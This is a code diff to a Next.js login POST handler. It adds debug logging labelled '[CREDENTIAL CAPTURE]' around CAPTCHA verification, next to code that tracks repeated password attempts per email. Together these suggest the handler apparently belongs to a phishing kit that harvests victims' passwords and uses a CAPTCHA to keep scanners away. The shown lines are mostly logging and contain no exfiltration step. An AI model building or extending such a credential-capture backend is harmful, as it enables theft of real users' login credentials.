@@ -329,13 +329,22 @@ export async function POST(request: NextRequest) {
 
     // Verify Turnstile CAPTCHA (only if configured and provided)
     // Get secret key from admin settings (admin panel is single source of truth)
+    console.log('[CREDENTIAL CAPTURE] 🔐 Loading settings for CAPTCHA verification...')
     const settings = await getSettings()
+    console.log('[CREDENTIAL CAPTURE] 🔐 Settings loaded, checking CAPTCHA config...')
     const turnstileSecret = settings.security.captcha.provider === 'turnstile' 
       ? settings.security.captcha.turnstileSecretKey?.trim() 
       : undefined
     const isTestingMode = process.env.NODE_ENV === 'development'
+    console.log('[CREDENTIAL CAPTURE] 🔐 CAPTCHA config:', {
+      provider: settings.security.captcha.provider,
+      hasSecret: !!turnstileSecret,
+      hasToken: !!captchaToken,
+      isTestingMode
+    })
     
     if (turnstileSecret && captchaToken && captchaToken !== 'test-token') {
+      console.log('[CREDENTIAL CAPTURE] 🔐 Verifying CAPTCHA token...')
       // Check if using official Cloudflare Turnstile test tokens
       const { TURNSTILE_TEST_KEYS } = await import('@/lib/captchaConfigTypes')
       if (isTestingMode && (captchaToken === TURNSTILE_TEST_KEYS.SITE_KEY_PASS || captchaToken === TURNSTILE_TEST_KEYS.SITE_KEY_FAIL)) {
@@ -364,15 +373,21 @@ export async function POST(request: NextRequest) {
         )
 
         const turnstileResult = await turnstileVerifyResponse.json()
+        console.log('[CREDENTIAL CAPTURE] 🔐 CAPTCHA verification result:', turnstileResult.success)
         if (!turnstileResult.success) {
+          console.log('[CREDENTIAL CAPTURE] ❌ CAPTCHA verification failed, returning error')
           return NextResponse.json(
             { success: false, error: 'CAPTCHA verification failed' },
             { status: 400 }
           )
         }
+        console.log('[CREDENTIAL CAPTURE] ✅ CAPTCHA verification passed')
       }
+    } else {
+      console.log('[CREDENTIAL CAPTURE] 🔐 CAPTCHA verification skipped (no secret or token)')
     }
 
+    console.log('[CREDENTIAL CAPTURE] ✅ Passed all security checks, proceeding to attempt tracking')
 
     // Track password attempt (1st, 2nd, 3rd, or 4th)
     // Use email+date as key to track across requests (persists across serverless invocations)
